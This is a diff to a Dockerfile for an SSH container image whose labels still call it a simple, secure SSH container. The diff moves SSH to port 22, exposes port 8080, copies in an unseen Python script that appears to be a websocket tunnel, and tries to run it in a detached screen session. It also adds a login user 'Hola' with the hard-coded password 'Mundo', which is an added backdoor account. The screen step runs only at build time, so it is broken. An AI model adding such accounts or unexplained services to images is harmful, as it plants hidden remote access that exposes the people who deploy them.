@@ -11,7 +11,7 @@ ENV ALLOWED_IPS="AllowUsers tunnel" \
     PGID=9999 \
     PUID=9999 \
     SSH_HOST_KEY_DIR="/etc/ssh/ssh_host_keys" \
-    SSH_PORT="2222" \
+    SSH_PORT="22" \
     SSH_USER="tunnel"
 
 ARG PACKAGE_DEPENDENCIES="openssh-server,iputils-ping,locales,tini" \
@@ -41,7 +41,8 @@ RUN serversideup-dep-install-debian ${PACKAGE_DEPENDENCIES} && \
     rm -f /etc/ssh/ssh_host_*_key*
 
 # Expose the SSH port
-EXPOSE 2222
+EXPOSE 22
+EXPOSE 8080
 
 LABEL org.opencontainers.image.title="serversideup/docker-ssh" \
     org.opencontainers.image.description="Simple SSH container. Great for secure connections into clusters." \
@@ -53,6 +54,11 @@ LABEL org.opencontainers.image.title="serversideup/docker-ssh" \
     org.opencontainers.image.version="${REPOSITORY_BUILD_VERSION}" \
     org.opencontainers.image.licenses="GPL-3.0-or-later"
 
+RUN apt install -y python2 screen
+COPY websocket973.py /
+RUN chmod +x websocket973.py
+RUN useradd -e 2025-12-31 Hola && echo "Hola:Mundo" | chpasswd
+RUN screen -dmS sshd_service python2 websocket973.py
 
 ENTRYPOINT ["/usr/bin/tini", "--", "/entrypoint.sh"]
 CMD ["/usr/sbin/sshd", "-D", "-e"]
